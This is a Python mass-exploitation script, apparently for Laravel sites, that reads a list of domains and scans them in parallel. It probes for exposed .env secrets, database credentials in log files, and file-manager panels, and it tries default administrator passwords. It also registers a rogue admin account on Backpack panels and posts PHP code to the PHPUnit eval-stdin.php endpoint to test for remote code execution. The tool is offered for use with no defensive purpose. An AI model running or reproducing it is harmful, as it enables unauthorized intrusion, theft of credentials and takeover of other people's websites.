import requests
import brotli
import gzip
import re
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BytesIO
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

php_code = """<?php $satu = "php"; $dua = "info"; $tiga = $satu . $dua; if (function_exists($tiga)) { $tiga(); } else { echo "Fungsi " . $tiga . " tidak ada."; } ?>"""
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "id,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Priority": "u=1",
    "Te": "trailers",
}

paths = [
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/laravel/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/beta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/kyc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/prod/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
]

if len(sys.argv) < 2:
    print("Usage: python script.py <listSite>")
    sys.exit(1)

listSite = sys.argv[1]
op = [i.strip() for i in open(listSite, "r").readlines()]
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN

files_and_words = [
    ("/packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("./vendor/packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/core/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/core/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/backend/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/backend/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/app/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/app/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/laravel/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/laravel/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/beta/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/beta/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/config/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/config/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/kyc/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/kyc/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/admin/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/admin/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/prod/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/prod/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/api/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/api/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/assets/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/assets/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/new/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/new/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/docker/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/docker/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/./.env", "APP_KEY:", 'result_env.txt'),
    ("/core/./.env", "APP_KEY:", 'result_env.txt'),
    ("/backend/./.env", "APP_KEY:", 'result_env.txt'),
    ("/app/./.env", "APP_KEY:", 'result_env.txt'),
    ("/laravel/./.env", "APP_KEY:", 'result_env.txt'),
    ("/laravel/core/./.env", "APP_KEY:", 'result_env.txt'),
    ("/beta/./.env", "APP_KEY:", 'result_env.txt'),
    ("/config/./.env", "APP_KEY:", 'result_env.txt'),
    ("/kyc/./.env", "APP_KEY:", 'result_env.txt'),
    ("/admin/./.env", "APP_KEY:", 'result_env.txt'),
    ("/prod/./.env", "APP_KEY:", 'result_env.txt'),
    ("/api/./.env", "APP_KEY:", 'result_env.txt'),
    ("/assets/./.env", "APP_KEY:", 'result_env.txt'),
    ("/new/./.env", "APP_KEY:", 'result_env.txt'),
    ("/admin/voyager-assets", "vendor/tcg/voyager", 'result_voyager.txt'),
    ("/storage/logs/laravel.log", "PDO->__construct('mysql:host=", 'result_laravel_logs.txt'),
    ("/register", None, 'result_register.txt'),
    ("/admin/register", None, 'result_register.txt'),
    ("/filemanager", None, 'result_filemanager.txt'),
    ("/laravel-filemanager", None, 'result_filemanager.txt')
]

def save_result(file, url):
    with open(file, 'a') as f:
        f.write(url + "\n")

def decompress_response(response):
    encoding = response.headers.get('Content-Encoding', '')
    if 'br' in encoding:
        return brotli.decompress(response.content).decode('utf-8')
    elif 'gzip' in encoding or 'deflate' in encoding:
        buf = BytesIO(response.content)
        with gzip.GzipFile(fileobj=buf) as f:
            return f.read().decode('utf-8')
    else:
        return response.text

def checkenv(site):
    for path, word, result_file in files_and_words:
        try:
            for protocol in ["http", "https"]:
                url = f"{protocol}://{site}{path}"
                request = requests.get(url, headers=headers, verify=False, timeout=10)
                if word:
                    if word in request.text:
                        save_result(result_file, url)
                else:
                    if path.endswith("/register") or path.endswith("/admin/register"):
                        if request.status_code == 404:
                            continue
                        elif "login" in request.url or request.status_code in [301, 302, 303, 307, 308]:
                            save_result(result_file, url)
                        elif "<form" in request.text:
                            save_result(result_file, url)
                    elif "login" in request.url:
                        save_result('result_filemanager.txt', url)
                    elif "filemanager/upload\" role='form' id='uploadForm' name='uploadForm'" in request.text:
                        save_result('result_filemanager.txt', url)
                
                # Additional validation for standalonepopup.js
                if path.endswith("standalonepopup.js") and request.status_code == 200 and 'content-type' in request.headers:
                    if "application/javascript" in request.headers['content-type']:
                        save_result(result_file, url)

                if path == "/admin/login":
                    ses = requests.Session()
                    getCsrf = ses.get(url)
                    if getCsrf.status_code == 200:
                        csrf = re.findall(r'"_token" value="(.*?)"', getCsrf.text)
                        if len(csrf) == 1:
                            data = {
                                "_token": csrf[0],
                                "email": "admin@admin.com",
                                "password": "password",
                                "remember": 1
                            }
                            try_login = ses.post(url, verify=False, timeout=10, data=data, allow_redirects=True)
                            if any(keyword in try_login.text for keyword in ['admin/profile', 'voyager-person', 'admin/logout', 'voyager-power', 'dashboard', 'voyager::']):
                                save_result('result_voyager.txt', url)
        except Exception as e:
            print(f"{fr}# {fw}" + site + f"{fw} | {fr}BOSOK")
            # Tidak menulis kesalahan ke file hasil jika tidak ditemukan atau terjadi kesalahan

def check_eval_stdin(site):
    for path in paths:
        full_url = f"http://{site}{path}"
        print(f"Checking URL: {full_url}")
        try:
            response = requests.get(full_url, headers=headers, timeout=timeout)
            if response.status_code == 200:
                print(f"Found {full_url}, attempting to execute PHP code...")
                response_exec = requests.post(full_url, headers=headers, data=php_code, timeout=timeout)
                print(f"Response status code: {response_exec.status_code}")
                print(f"Response headers: {response_exec.headers}")

                try:
                    response_text = decompress_response(response_exec)
                except Exception as e:
                    print(f"Error decompressing response from {full_url}: {e}")
                    response_text = response_exec.text

                print(f"Response text (first 500 chars): {response_text[:500]}")

                if response_exec.status_code == 200 and "<!DOCTYPE html" in response_text and "phpinfo()" in response_text:
                    result = f"{full_url} - eval-stdin.php ditemukan dan bisa dieksekusi."
                    with open("result_new.txt", "a", encoding='utf-8') as result_file:
                        result_file.write(result + "\n")
                    print(result)
                    return result
                else:
                    result = f"{full_url} - eval-stdin.php ditemukan tapi tidak bisa dieksekusi."
                    print(result)
                    return result
            else:
                result = f"{full_url} - eval-stdin.php tidak ditemukan."
                print(result)
                return result
        except requests.RequestException as e:
            print(f"{full_url} - Error: {str(e)}")
            continue
    return f"{site} - eval-stdin.php tidak ditemukan di semua jalur."

def test_backpack(site):
    try:
        url = f"https://{site}/admin/login"
        ses = requests.Session()
        getCsrf = ses.get(url)
        if getCsrf.status_code == 200:
            csrf = re.findall(r'"_token" value="(.*?)"', getCsrf.text)
            if len(csrf) == 1:
                login_data = {
                    "_token": csrf[0],
                    "email": "admin@example.com",
                    "password": "admin"
                }
                try_login = ses.post(url, verify=False, timeout=10, data=login_data, allow_redirects=True)
                if "dashboard" in try_login.text or "admin" in try_login.text:
                    elfinder_url = f"https://{site}/admin/elfinder"
                    elfinder_check = ses.get(elfinder_url, headers=headers, verify=False, timeout=10)
                    if "elfinder.min.css" in elfinder_check.text:
                        save_result('backpack.txt', elfinder_url)
            else:
                register_url = f"https://{site}/admin/register"
                get_register = ses.get(register_url)
                if "Registration is closed" not in get_register.text:
                    csrf = re.findall(r'"_token" value="(.*?)"', get_register.text)
                    if len(csrf) == 1:
                        register_data = {
                            "_token": csrf[0],
                            "name": "yucaerin",
                            "email": "yucaerin@hotmail.com",
                            "password": "123123123",
                            "password_confirmation": "123123123",
                            "role": "admin",
                            "role_id": "1"
                        }
                        try_register = ses.post(register_url, verify=False, timeout=10, data=register_data, allow_redirects=True)
                        if "dashboard" in try_register.text or "admin" in try_register.text:
                            elfinder_url = f"https://{site}/admin/elfinder"
                            elfinder_check = ses.get(elfinder_url, headers=headers, verify=False, timeout=10)
                            if "elfinder.min.css" in elfinder_check.text:
                                save_result('backpack.txt', elfinder_url)
    except Exception as e:
        print(f"{fr}# {fw}" + site + f"{fw} | {fr}BOSOK")

def main(file_path):
    domains = read_urls(file_path)
    results = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_domain = {executor.submit(check_eval_stdin, domain): domain for domain in domains}
        for future in as_completed(future_to_domain):
            domain = future_to_domain[future]
            try:
                result = future.result()
                results.append(result)
            except Exception as exc:
                error_message = f"{domain} - Exception: {str(exc)}"
                results.append(error_message)
                print(error_message)

    for result in results:
        print(result)

def read_urls(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        urls = file.readlines()
    return [url.strip() for url in urls]

kekw = Pool(50)  # Thread
kekw.map(checkenv, op)
kekw.map(test_backpack, op)
kekw.close()
kekw.join()

print("Selesai memproses semua situs.")

if __name__ == "__main__":
    main(listSite)
